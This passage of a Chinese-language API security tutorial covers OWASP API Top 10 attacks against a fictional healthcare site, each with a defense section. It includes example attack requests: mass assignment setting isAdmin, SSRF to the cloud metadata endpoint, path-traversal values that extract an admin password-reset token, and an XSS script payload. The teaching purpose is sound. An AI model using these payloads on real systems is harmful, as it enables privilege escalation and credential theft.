+<h3 id="攻擊手法-3：Broken-Object-Property-Level-Authorization（物件屬性層級授權失敗）"><a href="#攻擊手法-3：Broken-Object-Property-Level-Authorization（物件屬性層級授權失敗）" class="headerlink" title="攻擊手法 3：Broken Object Property Level Authorization（物件屬性層級授權失敗）"></a>攻擊手法 3：Broken Object Property Level Authorization（物件屬性層級授權失敗）</h3><p><strong>定義</strong>：<br><strong>Broken Object Property Level Authorization</strong> 是指 <strong>API</strong> 允許用戶修改或存取物件的敏感屬性（如 <code>isAdmin</code>），通常與 <strong>mass assignment</strong>（批量賦值）漏洞相關。</p>
+<p><strong>原理</strong>：<br><strong>Mass assignment</strong> 允許 <strong>API</strong> 自動將 <strong>request parameters</strong>（請求參數）綁定到物件屬性，若未限制敏感屬性，可能導致權限提升。</p>
+<p><strong>HealthCarePro 攻擊方法</strong>：<br>攻擊者通過 <strong>PATCH</strong> 請求修改患者物件的 <code>isAdmin</code> 屬性。</p>
+<p><strong>範例</strong>：  </p>
+<ol>
+<li><p><strong>權限提升</strong>：<br><strong>GET &#x2F;api&#x2F;patients&#x2F;123</strong> 返回：</p>
+<figure class="highlight json"><table><tr><td class="code"><pre><span class="line"><span class="punctuation">&#123;</span></span><br><span class="line">    <span class="attr">&quot;id&quot;</span><span class="punctuation">:</span> <span class="number">123</span><span class="punctuation">,</span></span><br><span class="line">    <span class="attr">&quot;name&quot;</span><span class="punctuation">:</span> <span class="string">&quot;John Doe&quot;</span><span class="punctuation">,</span></span><br><span class="line">    <span class="attr">&quot;email&quot;</span><span class="punctuation">:</span> <span class="string">&quot;john@example.com&quot;</span><span class="punctuation">,</span></span><br><span class="line">    <span class="attr">&quot;isAdmin&quot;</span><span class="punctuation">:</span> <span class="literal"><span class="keyword">false</span></span></span><br><span class="line"><span class="punctuation">&#125;</span></span><br></pre></td></tr></table></figure>
+<p>攻擊者發送：</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">PATCH /api/patients/123 HTTP/1.1</span><br><span class="line">Host: healthcarepro.com</span><br><span class="line">Content-Type: application/json</span><br><span class="line">&#123;</span><br><span class="line">    &quot;email&quot;: &quot;john@example.com&quot;,</span><br><span class="line">    &quot;isAdmin&quot;: true</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+<ul>
+<li>網站將 <code>isAdmin</code> 設為 <code>true</code>，攻擊者獲得管理員權限。</li>
+</ul>
+</li>
+<li><p><strong>隱藏參數測試</strong>：<br>攻擊者添加無效參數：</p>
+<figure class="highlight json"><table><tr><td class="code"><pre><span class="line"><span class="punctuation">&#123;</span></span><br><span class="line">    <span class="attr">&quot;email&quot;</span><span class="punctuation">:</span> <span class="string">&quot;john@example.com&quot;</span><span class="punctuation">,</span></span><br><span class="line">    <span class="attr">&quot;isAdmin&quot;</span><span class="punctuation">:</span> <span class="string">&quot;foo&quot;</span></span><br><span class="line"><span class="punctuation">&#125;</span></span><br></pre></td></tr></table></figure>
+<ul>
+<li>若回應不同，表示 <code>isAdmin</code> 可被綁定。</li>
+</ul>
+</li>
+</ol>
+<p><strong>白話解釋</strong>：<br>這就像在點餐單上多寫一句「我是老闆」，服務員沒檢查，直接把你當老闆。</p>
+<p><strong>防禦</strong>：  </p>
+<ul>
+<li>使用 <strong>allowlist</strong>（白名單）限制可更新的屬性。</li>
+<li>對敏感屬性（如 <code>isAdmin</code>）實施 <strong>blocklist</strong>（黑名單）。</li>
+<li>驗證和清理所有 <strong>request parameters</strong>。</li>
+</ul>
+<hr>
+<h3 id="攻擊手法-4：Unrestricted-Resource-Consumption（無限制資源消耗）"><a href="#攻擊手法-4：Unrestricted-Resource-Consumption（無限制資源消耗）" class="headerlink" title="攻擊手法 4：Unrestricted Resource Consumption（無限制資源消耗）"></a>攻擊手法 4：Unrestricted Resource Consumption（無限制資源消耗）</h3><p><strong>定義</strong>：<br><strong>Unrestricted Resource Consumption</strong> 是指 <strong>API</strong> 未限制資源使用，允許攻擊者通過大量請求耗盡伺服器資源，導致 <strong>denial-of-service</strong>（拒絕服務，DoS）。</p>
+<p><strong>原理</strong>：<br>攻擊者發送大量或複雜的 <strong>requests</strong>（如上傳大檔案、觸發重型查詢），耗盡 <strong>CPU</strong>、<strong>memory</strong>（記憶體）或 <strong>bandwidth</strong>（頻寬）。</p>
+<p><strong>HealthCarePro 攻擊方法</strong>：<br>攻擊者上傳大檔案或觸發複雜查詢，癱瘓 <strong>API</strong>。</p>
+<p><strong>範例</strong>：  </p>
+<ol>
+<li><p><strong>大檔案上傳</strong>：<br>攻擊者發送：</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">POST /api/upload/report HTTP/1.1</span><br><span class="line">Host: healthcarepro.com</span><br><span class="line">Content-Type: multipart/form-data; boundary=----WebKitFormBoundary</span><br><span class="line">----WebKitFormBoundary</span><br><span class="line">Content-Disposition: form-data; name=&quot;file&quot;; filename=&quot;large.pdf&quot;</span><br><span class="line">[10GB 檔案內容]</span><br><span class="line">----WebKitFormBoundary</span><br></pre></td></tr></table></figure>
+<ul>
+<li>耗盡伺服器磁碟空間。</li>
+</ul>
+</li>
+<li><p><strong>複雜查詢</strong>：<br>攻擊者發送：</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">GET /api/reports?date=2023-01-01&amp;details=full HTTP/1.1</span><br><span class="line">Host: healthcarepro.com</span><br></pre></td></tr></table></figure>
+<ul>
+<li>觸發耗時的資料庫查詢，耗盡 <strong>CPU</strong>。</li>
+</ul>
+</li>
+</ol>
+<p><strong>白話解釋</strong>：<br>這就像壞人一次點一萬份菜，廚房忙到崩潰，沒人能吃飯。</p>
+<p><strong>防禦</strong>：  </p>
+<ul>
+<li>實施 <strong>rate limiting</strong>（速率限制）和 <strong>throttling</strong>（流量控制）。</li>
+<li>限制檔案上傳大小和查詢複雜度。</li>
+<li>使用 <strong>Web Application Firewall</strong>（WAF，網頁應用防火牆）檢測異常流量。</li>
+</ul>
+<hr>
+<h3 id="攻擊手法-5：Broken-Function-Level-Authorization（功能層級授權失敗）"><a href="#攻擊手法-5：Broken-Function-Level-Authorization（功能層級授權失敗）" class="headerlink" title="攻擊手法 5：Broken Function Level Authorization（功能層級授權失敗）"></a>攻擊手法 5：Broken Function Level Authorization（功能層級授權失敗）</h3><p><strong>定義</strong>：<br><strong>Broken Function Level Authorization</strong> 是指 <strong>API</strong> 未正確限制用戶對特定功能的訪問，允許攻擊者執行未授權操作。</p>
+<p><strong>原理</strong>：<br><strong>API</strong> 端點可能支援未公開的 <strong>HTTP methods</strong>（如 <strong>DELETE</strong>），攻擊者可通過猜測或測試訪問管理員功能。</p>
+<p><strong>HealthCarePro 攻擊方法</strong>：<br>攻擊者使用未公開的 <strong>DELETE</strong> 方法刪除其他患者的預約。</p>
+<p><strong>範例</strong>：  </p>
+<ol>
+<li><p><strong>刪除預約</strong>：<br>攻擊者發送：</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">DELETE /api/appointments/789 HTTP/1.1</span><br><span class="line">Host: healthcarepro.com</span><br><span class="line">Authorization: Bearer [患者token]</span><br></pre></td></tr></table></figure>
+<ul>
+<li>網站未驗證權限，刪除 ID 789 的預約。</li>
+</ul>
+</li>
+<li><p><strong>隱藏功能測試</strong>：<br>攻擊者使用 <strong>Burp Intruder</strong> 測試：</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">PUT /api/admin/users/123</span><br><span class="line">POST /api/admin/reset</span><br></pre></td></tr></table></figure>
+<ul>
+<li>發現未公開的管理員功能。</li>
+</ul>
+</li>
+</ol>
+<p><strong>白話解釋</strong>：<br>這就像服務員沒檢查你的身份，讓你用管理員的權限取消別人的訂位。</p>
+<p><strong>防禦</strong>：  </p>
+<ul>
+<li>對所有 <strong>HTTP methods</strong> 實施 <strong>authorization checks</strong>（授權檢查）。</li>
+<li>使用 <strong>role-based access control</strong>（基於角色的存取控制，RBAC）。</li>
+<li>隱藏未公開的 <strong>API endpoints</strong>。</li>
+</ul>
+<hr>
+<h3 id="攻擊手法-6：Unrestricted-Access-to-Sensitive-Business-Flows（無限制存取敏感業務流程）"><a href="#攻擊手法-6：Unrestricted-Access-to-Sensitive-Business-Flows（無限制存取敏感業務流程）" class="headerlink" title="攻擊手法 6：Unrestricted Access to Sensitive Business Flows（無限制存取敏感業務流程）"></a>攻擊手法 6：Unrestricted Access to Sensitive Business Flows（無限制存取敏感業務流程）</h3><p><strong>定義</strong>：<br><strong>Unrestricted Access to Sensitive Business Flows</strong> 是指 <strong>API</strong> 未限制對關鍵業務流程的訪問，允許攻擊者執行破壞性操作，如取消預約或修改訂單。</p>
+<p><strong>原理</strong>：<br>敏感的 <strong>business logic</strong>（業務邏輯）若未受保護，攻擊者可通過 <strong>API</strong> 直接調用，繞過前端限制。</p>
+<p><strong>HealthCarePro 攻擊方法</strong>：<br>攻擊者取消其他患者的醫療預約。</p>
+<p><strong>範例</strong>：  </p>
+<ol>
+<li><p><strong>取消預約</strong>：<br>攻擊者發送：</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">POST /api/appointments/456/cancel HTTP/1.1</span><br><span class="line">Host: healthcarepro.com</span><br><span class="line">Authorization: Bearer [患者token]</span><br></pre></td></tr></table></figure>
+<ul>
+<li>網站未驗證權限，取消 ID 456 的預約。</li>
+</ul>
+</li>
+<li><p><strong>批量操作</strong>：<br>攻擊者發送：</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">POST /api/appointments/bulk-cancel HTTP/1.1</span><br><span class="line">Host: healthcarepro.com</span><br><span class="line">Content-Type: application/json</span><br><span class="line">&#123;</span><br><span class="line">    &quot;appointmentIds&quot;: [456, 789, 1011]</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+<ul>
+<li>取消多個預約。</li>
+</ul>
+</li>
+</ol>
+<p><strong>白話解釋</strong>：<br>這就像壞人直接跟廚房說「取消所有訂單」，服務員沒擋住，結果全餐廳的菜都被取消。</p>
+<p><strong>防禦</strong>：  </p>
+<ul>
+<li>對敏感 <strong>business flows</strong> 實施嚴格的 <strong>authorization</strong>。</li>
+<li>使用 <strong>CSRF tokens</strong>（跨站請求偽造令牌）防止未授權請求。</li>
+<li>監控異常的 <strong>API</strong> 使用模式。</li>
+</ul>
+<hr>
+<h3 id="攻擊手法-7：Server-Side-Request-Forgery（伺服器端請求偽造，SSRF）"><a href="#攻擊手法-7：Server-Side-Request-Forgery（伺服器端請求偽造，SSRF）" class="headerlink" title="攻擊手法 7：Server-Side Request Forgery（伺服器端請求偽造，SSRF）"></a>攻擊手法 7：Server-Side Request Forgery（伺服器端請求偽造，SSRF）</h3><p><strong>定義</strong>：<br><strong>Server-Side Request Forgery</strong>（SSRF）是指攻擊者誘導 <strong>API</strong> 發送 <strong>HTTP requests</strong> 到任意伺服器，存取內部系統或洩露敏感資料。</p>
+<p><strong>原理</strong>：<br><strong>API</strong> 若允許用戶指定外部 <strong>URLs</strong>（如圖片連結），攻擊者可誘導伺服器訪問內部資源（如 <code>http://localhost</code>）。</p>
+<p><strong>HealthCarePro 攻擊方法</strong>：<br>攻擊者誘導 <strong>API</strong> 訪問內部管理介面。</p>
+<p><strong>範例</strong>：  </p>
+<ol>
+<li><p><strong>內部系統訪問</strong>：<br>攻擊者發送：</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">POST /api/upload/avatar HTTP/1.1</span><br><span class="line">Host: healthcarepro.com</span><br><span class="line">Content-Type: application/json</span><br><span class="line">&#123;</span><br><span class="line">    &quot;avatarUrl&quot;: &quot;http://localhost:8080/admin&quot;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+<ul>
+<li>伺服器訪問內部管理介面，返回敏感資料。</li>
+</ul>
+</li>
+<li><p><strong>元資料洩露</strong>：<br>攻擊者發送：</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">POST /api/upload/avatar HTTP/1.1</span><br><span class="line">Host: healthcarepro.com</span><br><span class="line">Content-Type: application/json</span><br><span class="line">&#123;</span><br><span class="line">    &quot;avatarUrl&quot;: &quot;http://169.254.169.254/latest/meta-data/&quot;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+<ul>
+<li>獲取雲端伺服器的元資料（如 AWS 憑證）。</li>
+</ul>
+</li>
+</ol>
+<p><strong>白話解釋</strong>：<br>這就像騙服務員去廚房裡的秘密檔案室拿資料，結果他把機密文件帶出來給你。</p>
+<p><strong>防禦</strong>：  </p>
+<ul>
+<li>驗證和限制 <strong>URL</strong> 輸入（僅允許白名單域名）。</li>
+<li>禁用內部網路訪問（如 <code>localhost</code>、私有 IP）。</li>
+<li>使用 <strong>WAF</strong> 過濾惡意 <strong>URLs</strong>。</li>
+</ul>
+<hr>
+<h3 id="攻擊手法-8：Security-Misconfiguration（安全配置錯誤）"><a href="#攻擊手法-8：Security-Misconfiguration（安全配置錯誤）" class="headerlink" title="攻擊手法 8：Security Misconfiguration（安全配置錯誤）"></a>攻擊手法 8：Security Misconfiguration（安全配置錯誤）</h3><p><strong>定義</strong>：<br><strong>Security Misconfiguration</strong> 是指 <strong>API</strong> 的配置錯誤，如公開的 <strong>API documentation</strong>、未限制的 <strong>HTTP methods</strong> 或洩露錯誤訊息，增加攻擊風險。</p>
+<p><strong>原理</strong>：<br>錯誤配置暴露 <strong>attack surface</strong>，如未保護的 <strong>API endpoints</strong> 或詳細的 <strong>error messages</strong>（錯誤訊息）洩露系統資訊。</p>
+<p><strong>HealthCarePro 攻擊方法</strong>：<br>攻擊者利用公開的 <strong>API documentation</strong> 和詳細錯誤訊息，發現隱藏端點。</p>
+<p><strong>範例</strong>：  </p>
+<ol>
+<li><p><strong>公開文件</strong>：<br>攻擊者訪問：</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">GET /api/openapi.json HTTP/1.1</span><br><span class="line">Host: healthcarepro.com</span><br></pre></td></tr></table></figure>
+<ul>
+<li>發現未公開端點 <code>/api/admin/users</code>。</li>
+</ul>
+</li>
+<li><p><strong>錯誤訊息洩露</strong>：<br>攻擊者發送：</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">GET /api/patients/invalid HTTP/1.1</span><br><span class="line">Host: healthcarepro.com</span><br></pre></td></tr></table></figure>
+<ul>
+<li>回應：<figure class="highlight json"><table><tr><td class="code"><pre><span class="line"><span class="punctuation">&#123;</span></span><br><span class="line">    <span class="attr">&quot;error&quot;</span><span class="punctuation">:</span> <span class="string">&quot;Invalid endpoint. Available endpoints: /api/patients, /api/admin&quot;</span></span><br><span class="line"><span class="punctuation">&#125;</span></span><br></pre></td></tr></table></figure></li>
+<li>暴露管理員端點。</li>
+</ul>
+</li>
+</ol>
+<p><strong>白話解釋</strong>：<br>這就像餐廳把內部菜單（<strong>API documentation</strong>）和廚房秘密（<strong>error messages</strong>）公開，壞人輕鬆找到漏洞。</p>
+<p><strong>防禦</strong>：  </p>
+<ul>
+<li>限制 <strong>API documentation</strong> 的訪問（需要身份驗證）。</li>
+<li>使用通用的 <strong>error messages</strong>（如「無效請求」）。</li>
+<li>禁用不必要的 <strong>HTTP methods</strong> 和端點。</li>
+</ul>
+<hr>
+<h3 id="攻擊手法-9：Improper-Inventory-Management（不當的資產管理）"><a href="#攻擊手法-9：Improper-Inventory-Management（不當的資產管理）" class="headerlink" title="攻擊手法 9：Improper Inventory Management（不當的資產管理）"></a>攻擊手法 9：Improper Inventory Management（不當的資產管理）</h3><p><strong>定義</strong>：<br><strong>Improper Inventory Management</strong> 是指未正確管理 <strong>API</strong> 資產，導致舊版或未公開的 <strong>API endpoints</strong> 暴露，增加攻擊風險。</p>
+<p><strong>原理</strong>：<br>舊版 <strong>API</strong>（如 <code>/api/v1</code>）可能包含已知漏洞，攻擊者可通過猜測或發現這些端點進行攻擊。</p>
+<p><strong>HealthCarePro 攻擊方法</strong>：<br>攻擊者發現並利用舊版 <strong>API</strong> 的漏洞。</p>
+<p><strong>範例</strong>：  </p>
+<ol>
+<li><p><strong>舊版端點</strong>：<br>攻擊者發送：</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">GET /api/v1/patients/123 HTTP/1.1</span><br><span class="line">Host: healthcarepro.com</span><br></pre></td></tr></table></figure>
+<ul>
+<li>舊版 <strong>API</strong> 缺乏 <strong>authorization</strong>，洩露患者資料。</li>
+</ul>
+</li>
+<li><p><strong>隱藏端點</strong>：<br>攻擊者使用 <strong>Burp Intruder</strong> 測試：</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">GET /api/internal/users</span><br><span class="line">GET /api/debug/logs</span><br></pre></td></tr></table></figure>
+<ul>
+<li>發現未記錄的端點，獲取日誌或用戶資料。</li>
+</ul>
+</li>
+</ol>
+<p><strong>白話解釋</strong>：<br>這就像餐廳忘了關閉舊的秘密入口，壞人從那進去偷東西。</p>
+<p><strong>防禦</strong>：  </p>
+<ul>
+<li>定期審計和移除舊版 <strong>API</strong>。</li>
+<li>使用版本控制（如 <code>/api/v2</code>）並禁用舊版本。</li>
+<li>實施 <strong>API gateway</strong>（API 網關）管理端點。</li>
+</ul>
+<hr>
+<h3 id="攻擊手法-10：Unsafe-Consumption-of-APIs（不安全的-API-消費）"><a href="#攻擊手法-10：Unsafe-Consumption-of-APIs（不安全的-API-消費）" class="headerlink" title="攻擊手法 10：Unsafe Consumption of APIs（不安全的 API 消費）"></a>攻擊手法 10：Unsafe Consumption of APIs（不安全的 API 消費）</h3><p><strong>定義</strong>：<br><strong>Unsafe Consumption of APIs</strong> 是指 <strong>API</strong> 對外部或第三方 <strong>API</strong> 的請求未經充分驗證，導致漏洞如 <strong>SSRF</strong> 或 <strong>data tampering</strong>（資料篡改）。</p>
+<p><strong>原理</strong>：<br><strong>API</strong> 若直接處理外部 <strong>API</strong> 的回應，攻擊者可注入惡意資料或誘導伺服器發送危險請求。</p>
+<p><strong>HealthCarePro 攻擊方法</strong>：<br>攻擊者誘導 <strong>API</strong> 從惡意外部 <strong>API</strong> 獲取資料。</p>
+<p><strong>範例</strong>：  </p>
+<ol>
+<li><p><strong>惡意資料注入</strong>：<br>攻擊者控制的外部 <strong>API</strong> 返回：</p>
+<figure class="highlight json"><table><tr><td class="code"><pre><span class="line"><span class="punctuation">&#123;</span></span><br><span class="line">    <span class="attr">&quot;patientId&quot;</span><span class="punctuation">:</span> <span class="number">123</span><span class="punctuation">,</span></span><br><span class="line">    <span class="attr">&quot;name&quot;</span><span class="punctuation">:</span> <span class="string">&quot;&lt;script&gt;alert(&#x27;hacked&#x27;)&lt;/script&gt;&quot;</span></span><br><span class="line"><span class="punctuation">&#125;</span></span><br></pre></td></tr></table></figure>
+<ul>
+<li>HealthCarePro 直接儲存，導致 <strong>XSS</strong>（跨站腳本攻擊）。</li>
+</ul>
+</li>
+<li><p><strong>SSRF 利用</strong>：<br>攻擊者發送：</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">POST /api/integrate/external-report HTTP/1.1</span><br><span class="line">Host: healthcarepro.com</span><br><span class="line">Content-Type: application/json</span><br><span class="line">&#123;</span><br><span class="line">    &quot;reportUrl&quot;: &quot;http://internal-server:8080/secrets&quot;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+<ul>
+<li>伺服器訪問內部系統，洩露機密。</li>
+</ul>
+</li>
+</ol>
+<p><strong>白話解釋</strong>：<br>這就像餐廳從不知名的供應商（外部 <strong>API</strong>）拿食材，結果食材有毒（惡意資料），害了顧客。</p>
+<p><strong>防禦</strong>：  </p>
+<ul>
+<li>驗證和清理外部 <strong>API</strong> 的回應。</li>
+<li>限制外部 <strong>API</strong> 的 <strong>URLs</strong>（白名單）。</li>
+<li>使用 <strong>secure coding practices</strong>（安全編碼實踐）處理資料。</li>
+</ul>
+<hr>
+<h3 id="攻擊手法-11：Server-Side-Parameter-Pollution（伺服器端參數污染）"><a href="#攻擊手法-11：Server-Side-Parameter-Pollution（伺服器端參數污染）" class="headerlink" title="攻擊手法 11：Server-Side Parameter Pollution（伺服器端參數污染）"></a>攻擊手法 11：Server-Side Parameter Pollution（伺服器端參數污染）</h3><p><strong>定義</strong>：<br><strong>Server-Side Parameter Pollution</strong>（SSPP）是一種進階攻擊，攻擊者操縱 <strong>API</strong> 參數，影響伺服器端的 <strong>URL path</strong> 或 <strong>query string</strong>，誘導執行未授權操作。</p>
+<p><strong>原理</strong>：<br><strong>API</strong> 若將用戶輸入直接拼接進伺服器端請求的 <strong>URL</strong>，攻擊者可注入 <strong>path traversal</strong>（路徑穿越）或 <strong>delimiter</strong>（分隔符），改變請求目標。</p>
+<p><strong>HealthCarePro 攻擊方法</strong>：<br>攻擊者操縱 <strong>username</strong> 參數，獲取管理員的 <strong>password reset token</strong>。</p>
+<p><strong>範例</strong>：  </p>
+<ol>
+<li><p><strong>路徑穿越</strong>：<br>攻擊者發送：</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">POST /api/forgot-password HTTP/1.1</span><br><span class="line">Host: healthcarepro.com</span><br><span class="line">Content-Type: application/json</span><br><span class="line">&#123;</span><br><span class="line">    &quot;username&quot;: &quot;../../v1/users/administrator/field/passwordResetToken%23&quot;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+<ul>
+<li>伺服器拼接為：<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">/api/v1/users/administrator/field/passwordResetToken</span><br></pre></td></tr></table></figure></li>
+<li>返回管理員的 <strong>password reset token</strong>。</li>
+</ul>
+</li>
+<li><p><strong>分隔符注入</strong>：<br>攻擊者發送：</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">POST /api/forgot-password HTTP/1.1</span><br><span class="line">Host: healthcarepro.com</span><br><span class="line">Content-Type: application/json</span><br><span class="line">&#123;</span><br><span class="line">    &quot;username&quot;: &quot;administrator%3Ffield=passwordResetToken&quot;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+<ul>
+<li>伺服器解析為查詢管理員的 <strong>token</strong>，洩露敏感資料。</li>
+</ul>
+</li>
+</ol>
+<p><strong>白話解釋</strong>：<br>這就像在點餐單上寫亂七八糟的地址，騙服務員去拿別人的機密文件（<strong>token</strong>）。</p>
+<p><strong>防禦</strong>：  </p>
+<ul>
+<li>對用戶輸入進行 <strong>sanitization</strong>（清理）和 <strong>validation</strong>（驗證）。</li>
+<li>避免將用戶輸入直接拼接進 <strong>URL</strong>。</li>
+<li>使用 <strong>parameter binding</strong>（參數綁定）處理請求。</li>
+</ul>
+<hr>
+<h2 id="檢測-API-漏洞的方法-Detecting-API-Vulnerabilities"><a href="#檢測-API-漏洞的方法-Detecting-API-Vulnerabilities" class="headerlink" title="檢測 API 漏洞的方法 &#x2F; Detecting API Vulnerabilities"></a>檢測 API 漏洞的方法 &#x2F; Detecting API Vulnerabilities</h2><p>檢測 <strong>API</strong> 漏洞需要系統化的 <strong>reconnaissance</strong>（偵察）和測試。以下是具體步驟：</p>
+<ol>
+<li><p><strong>Discover API Endpoints</strong>（發現 API 端點）：  </p>
+<ul>
+<li>檢查 <strong>API documentation</strong>（如 <code>/openapi.json</code>、<code>/swagger</code>）。</li>
+<li>使用 <strong>Burp Scanner</strong> 爬取應用程式，尋找 <strong>&#x2F;api&#x2F;</strong> 模式。</li>
+<li>分析 <strong>JavaScript</strong> 檔案（使用 <strong>JS Link Finder BApp</strong>）。</li>
+</ul>
+</li>
+<li><p><strong>Test HTTP Methods</strong>（測試 HTTP 方法）：  </p>
+<ul>
+<li>使用 <strong>Burp Intruder</strong> 測試所有 <strong>HTTP methods</strong>（<strong>GET</strong>、<strong>POST</strong>、<strong>DELETE</strong> 等）。</li>
+<li>檢查是否支援未公開方法。</li>
+</ul>
+</li>
+<li><p><strong>Test Content Types</strong>（測試內容類型）：  </p>
+<ul>
+<li>修改 <strong>Content-Type</strong> 標頭（如 <code>application/json</code> 改為 <code>application/xml</code>）。</li>
+<li>使用 <strong>Content type converter BApp</strong> 轉換格式，觸發錯誤。</li>
+</ul>
+</li>
+<li><p><strong>Find Hidden Parameters</strong>（發現隱藏參數）：  </p>
+<ul>
+<li>使用 <strong>Param Miner BApp</strong> 猜測參數名稱。</li>
+<li>檢查 <strong>mass assignment</strong>，測試敏感屬性（如 <code>isAdmin</code>）。</li>
+</ul>
+</li>
+<li><p><strong>Probe Server-Side Parameter Pollution</strong>（探測伺服器端參數污染）：  </p>
+<ul>
+<li>注入 <strong>path traversal</strong>（如 <code>../</code>）或 <strong>delimiter</strong>（如 <code>%23</code>）。</li>
+<li>檢查錯誤訊息是否洩露 <strong>API endpoints</strong>。</li>
+</ul>
+</li>
+</ol>
+<p><strong>範例</strong>：<br>發送：</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">GET /api/patients/123?test=foo HTTP/1.1</span><br><span class="line">Host: healthcarepro.com</span><br></pre></td></tr></table></figure>
+<p>若回應包含錯誤訊息：</p>
+<figure class="highlight json"><table><tr><td class="code"><pre><span class="line"><span class="punctuation">&#123;</span></span><br><span class="line">    <span class="attr">&quot;error&quot;</span><span class="punctuation">:</span> <span class="string">&quot;Invalid parameter: test. Supported: id, email, isAdmin&quot;</span></span><br><span class="line"><span class="punctuation">&#125;</span></span><br></pre></td></tr></table></figure>
+<p>則暴露隱藏參數 <code>isAdmin</code>。</p>
+<p><strong>白話解釋</strong>：<br>這就像檢查餐廳的每個角落（<strong>endpoints</strong>），試試不同的點餐方式（<strong>HTTP methods</strong>），看看能不能找到秘密菜單（隱藏參數）或漏洞。</p>
+<hr>
+<h2 id="防禦-API-漏洞的策略-Defense-Strategies-Against-API-Vulnerabilities"><a href="#防禦-API-漏洞的策略-Defense-Strategies-Against-API-Vulnerabilities" class="headerlink" title="防禦 API 漏洞的策略 &#x2F; Defense Strategies Against API Vulnerabilities"></a>防禦 API 漏洞的策略 &#x2F; Defense Strategies Against API Vulnerabilities</h2><p>以下是防禦 <strong>API</strong> 漏洞的最佳實踐：</p>
+<ol>
+<li><p><strong>Secure API Documentation</strong>（保護 API 文件）：  </p>
+<ul>
+<li>限制公開 <strong>API documentation</strong> 的訪問（需要 <strong>authentication</strong>）。</li>
+<li>確保文件與當前版本一致。</li>
+</ul>
+</li>
+<li><p><strong>Implement Strong Authentication and Authorization</strong>（實施強身份驗證和授權）：  </p>
+<ul>
+<li>使用 <strong>OAuth 2.0</strong> 或 <strong>JWT</strong> 進行 <strong>authentication</strong>。</li>
+<li>對每個 <strong>endpoint</strong> 和 <strong>method</strong> 實施 <strong>object-level</strong> 和 <strong>function-level authorization</strong>。</li>
+</ul>
+</li>
+<li><p><strong>Restrict HTTP Methods and Content Types</strong>（限制 HTTP 方法和內容類型）：  </p>
+<ul>
+<li>使用 <strong>allowlist</strong> 指定允許的 <strong>HTTP methods</strong> 和 <strong>Content-Type</strong>。</li>
+<li>禁用不必要的 <strong>methods</strong>（如 <strong>OPTIONS</strong>）。</li>
+</ul>
+</li>
+<li><p><strong>Prevent Mass Assignment</strong>（防止批量賦值）：  </p>
+<ul>
+<li>使用 <strong>allowlist</strong> 限制可綁定的屬性。</li>
+<li>對敏感屬性實施 <strong>validation</strong>。</li>
+</ul>
+</li>
+<li><p><strong>Mitigate SSRF and SSPP</strong>（減輕 SSRF 和 SSPP）：  </p>
+<ul>
+<li>驗證和限制 <strong>URL</strong> 輸入。</li>
+<li>對用戶輸入進行 <strong>sanitization</strong>，避免拼接進 <strong>URL</strong>。</li>
+</ul>
+</li>
+<li><p><strong>Monitor and Audit</strong>（監控和審計）：  </p>
+<ul>
+<li>使用 <strong>API gateway</strong> 監控流量。</li>
+<li>定期使用 <strong>Burp Scanner</strong> 測試漏洞。</li>
+</ul>
+</li>
+</ol>
+<p><strong>白話解釋</strong>：<br>防禦就像給餐廳加裝監視器（<strong>monitoring</strong>）、檢查顧客身份（<strong>authentication</strong>）、限制菜單選項（<strong>allowlist</strong>），確保壞人無法搗亂。</p>
+<hr>
+<h2 id="實際案例分析-Real-World-Examples-and-Case-Studies"><a href="#實際案例分析-Real-World-Examples-and-Case-Studies" class="headerlink" title="實際案例分析 &#x2F; Real-World Examples and Case Studies"></a>實際案例分析 &#x2F; Real-World Examples and Case Studies</h2><p>以下是基於現實風險的假想案例：</p>
+<ol>
+<li><p>**Patient Data Leak (2024)**：<br>一家醫療平台因 <strong>BOLA</strong> 漏洞，攻擊者通過修改 <strong>patient ID</strong> 獲取數千患者的醫療記錄，導致重大隱私洩露。</p>
+</li>
+<li><p>**DoS Attack (2025)**：<br>攻擊者利用 <strong>unrestricted resource consumption</strong>，上傳大量大檔案，癱瘓醫療平台的 <strong>API</strong>，影響患者預約。</p>
+</li>
+</ol>
+<p><strong>白話解釋</strong>：<br>這些案例就像餐廳沒檢查顧客身份，結果讓壞人偷走顧客資料，或點太多菜把廚房搞垮。</p>
+<hr>
+<h2 id="結論-Conclusion"><a href="#結論-Conclusion" class="headerlink" title="結論 &#x2F; Conclusion"></a>結論 &#x2F; Conclusion</h2><p><strong>API Testing</strong> 是確保 <strong>API</strong> 安全性的關鍵過程，涵蓋 <strong>OWASP API Security Top 10</strong> 的所有風險。通過了解 <strong>API</strong> 的運作原理、攻擊手法和防禦策略，開發者可有效保護應用程式。對於初學者，學習 <strong>API Testing</strong> 不僅提升安全意識，還能深入理解 <strong>HTTP</strong> 和現代應用程式架構。建議使用 <a target="_blank" rel="noopener" href="https://portswigger.net/burp">Burp Suite</a> 進行實戰練習，並參考 <a target="_blank" rel="noopener" href="https://owasp.org/www-project-api-security/">OWASP API Security Top 10</a> 獲取更多資訊。</p>
+<hr>
+<p><strong>Key Citations</strong>:</p>
+<ul>
